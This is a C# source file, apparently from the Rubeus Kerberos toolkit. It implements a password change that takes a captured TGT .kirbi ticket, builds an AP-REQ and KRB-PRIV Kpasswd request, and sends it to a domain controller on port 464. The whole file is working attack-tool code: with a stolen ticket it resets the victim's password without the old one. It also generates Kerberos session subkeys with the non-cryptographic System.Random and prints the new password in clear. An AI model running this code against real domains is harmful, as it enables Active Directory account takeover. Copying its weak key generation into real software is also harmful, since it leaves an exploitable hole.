using System;
using System.IO;
using System.Linq;
using Asn1;

namespace Rubeus
{
    public class Reset
    {
        public static void UserPassword(KRB_CRED kirbi, string newPassword, string domainController = "")
        {
            // implements the Kerberos-based password reset originally disclosed by Aorato
            //      This function is misc::changepw in Kekeo
            // Takes a valid TGT .kirbi and builds a MS Kpasswd password change sequence
            //      AP-REQ with randomized sub session key
            //      KRB-PRIV structure containing ChangePasswdData, enc w/ the sub session key
            // reference: Microsoft Windows 2000 Kerberos Change Password and Set Password Protocols (RFC3244)

            string dcIP = Networking.GetDCIP(domainController);
            if (String.IsNullOrEmpty(dcIP)) { return; }

            // extract the user and domain from the existing .kirbi ticket
            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
            string userDomain = kirbi.enc_part.ticket_info[0].prealm;

            Console.WriteLine("[*] Changing password for user: {0}@{1}", userName, userDomain);
            Console.WriteLine("[*] New password value: {0}", newPassword);

            // build the AP_REQ using the user ticket's keytype and key
            Console.WriteLine("[*] Building AP-REQ for the MS Kpassword request");
            AP_REQ ap_req = new AP_REQ(userDomain, userName, kirbi.tickets[0], kirbi.enc_part.ticket_info[0].key.keyvalue, (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR);

            // create a new session subkey for the Authenticator and match the encryption type of the user key
            Console.WriteLine("[*] Building Authenticator with encryption key type: {0}", (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype);
            ap_req.authenticator.subkey = new EncryptionKey();
            ap_req.authenticator.subkey.keytype = kirbi.enc_part.ticket_info[0].key.keytype;

            // generate a random session subkey
            Random random = new Random();
            byte[] randKeyBytes;
            Interop.KERB_ETYPE randKeyEtype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;
            if (randKeyEtype == Interop.KERB_ETYPE.rc4_hmac)
            {
                randKeyBytes = new byte[16];
                random.NextBytes(randKeyBytes);
                ap_req.authenticator.subkey.keyvalue = randKeyBytes;
            }
            else if (randKeyEtype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
            {
                randKeyBytes = new byte[32];
                random.NextBytes(randKeyBytes);
                ap_req.authenticator.subkey.keyvalue = randKeyBytes;
            }
            else
            {
                Console.WriteLine("[X] Only rc4_hmac and aes256_cts_hmac_sha1 key hashes supported at this time!");
                return;
            }

            Console.WriteLine("[*] base64(session subkey): {0}", Convert.ToBase64String(randKeyBytes));

            // randKeyBytes is now the session key used for the KRB-PRIV structure

            var rand = new Random();
            ap_req.authenticator.seq_number = (UInt32)rand.Next(1, Int32.MaxValue);

            // now build the KRV-PRIV structure
            Console.WriteLine("[*] Building the KRV-PRIV structure");
            KRB_PRIV changePriv = new KRB_PRIV(randKeyEtype, randKeyBytes);

            // the new password to set for the user
            changePriv.enc_part = new EncKrbPrivPart(newPassword, "lol");


            // now build the final MS Kpasswd request

            byte[] apReqBytes = ap_req.Encode().Encode();
            byte[] changePrivBytes = changePriv.Encode().Encode();

            byte[] packetBytes = new byte[10 + apReqBytes.Length + changePrivBytes.Length];

            short msgLength = (short)(packetBytes.Length - 4);
            byte[] msgLengthBytes = BitConverter.GetBytes(msgLength);
            System.Array.Reverse(msgLengthBytes);

            // Record Mark
            packetBytes[2] = msgLengthBytes[0];
            packetBytes[3] = msgLengthBytes[1];

            // Message Length
            packetBytes[4] = msgLengthBytes[0];
            packetBytes[5] = msgLengthBytes[1];

            // Version (Reply)
            packetBytes[6] = 0x0;
            packetBytes[7] = 0x1;

            // AP_REQ Length
            short apReqLen = (short)(apReqBytes.Length);
            byte[] apReqLenBytes = BitConverter.GetBytes(apReqLen);
            System.Array.Reverse(apReqLenBytes);
            packetBytes[8] = apReqLenBytes[0];
            packetBytes[9] = apReqLenBytes[1];

            // AP_REQ
            Array.Copy(apReqBytes, 0, packetBytes, 10, apReqBytes.Length);

            // KRV-PRIV
            Array.Copy(changePrivBytes, 0, packetBytes, apReqBytes.Length + 10, changePrivBytes.Length);

            // KPASSWD_DEFAULT_PORT = 464
            byte[] response = Networking.SendBytes(dcIP, 464, packetBytes, true);
            if (response == null)
            {
                return;
            }

            try
            {
                AsnElt responseAsn = AsnElt.Decode(response, false);

                // check the response value
                int responseTag = responseAsn.TagValue;

                if (responseTag == 30)
                {
                    // parse the response to an KRB-ERROR
                    KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                    Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
                }
            }
            catch { }

            // otherwise parse the resulting KRB-PRIV from the server

            byte[] respRecordMarkBytes = { response[0], response[1], response[2], response[3] };
            Array.Reverse(respRecordMarkBytes);
            int respRecordMark = BitConverter.ToInt32(respRecordMarkBytes, 0);

            byte[] respMsgLenBytes = { response[4], response[5] };
            Array.Reverse(respMsgLenBytes);
            int respMsgLen = BitConverter.ToInt16(respMsgLenBytes, 0);

            byte[] respVersionBytes = { response[6], response[7] };
            Array.Reverse(respVersionBytes);
            int respVersion = BitConverter.ToInt16(respVersionBytes, 0);

            byte[] respAPReqLenBytes = { response[8], response[9] };
            Array.Reverse(respAPReqLenBytes);
            int respAPReqLen = BitConverter.ToInt16(respAPReqLenBytes, 0);

            byte[] respAPReq = new byte[respAPReqLen];
            Array.Copy(response, 10, respAPReq, 0, respAPReqLen);

            int respKRBPrivLen = respMsgLen - respAPReqLen - 6;
            byte[] respKRBPriv = new byte[respKRBPrivLen];
            Array.Copy(response, 10 + respAPReqLen, respKRBPriv, 0, respKRBPrivLen);

            // decode the KRB-PRIV response
            AsnElt respKRBPrivAsn = AsnElt.Decode(respKRBPriv, false);

            foreach(AsnElt elem in respKRBPrivAsn.Sub[0].Sub)
            {
                if(elem.TagValue == 3)
                {
                    byte[] encBytes = elem.Sub[0].Sub[1].GetOctetString();
                    byte[] decBytes = Crypto.KerberosDecrypt(randKeyEtype, Interop.KRB_KEY_USAGE_KRB_PRIV_ENCRYPTED_PART, randKeyBytes, encBytes);
                    AsnElt decBytesAsn = AsnElt.Decode(decBytes, false);

                    byte[] responseCodeBytes = decBytesAsn.Sub[0].Sub[0].Sub[0].GetOctetString();
                    Array.Reverse(responseCodeBytes);
                    short responseCode = BitConverter.ToInt16(responseCodeBytes, 0);
                    if (responseCode == 0)
                    {
                        Console.WriteLine("[+] Password change success!");
                    }
                    else
                    {
                        Console.WriteLine("[X] Password change error: {0}", (Interop.KADMIN_PASSWD_ERR)responseCode);
                    }
                }
            }
        }
    }
}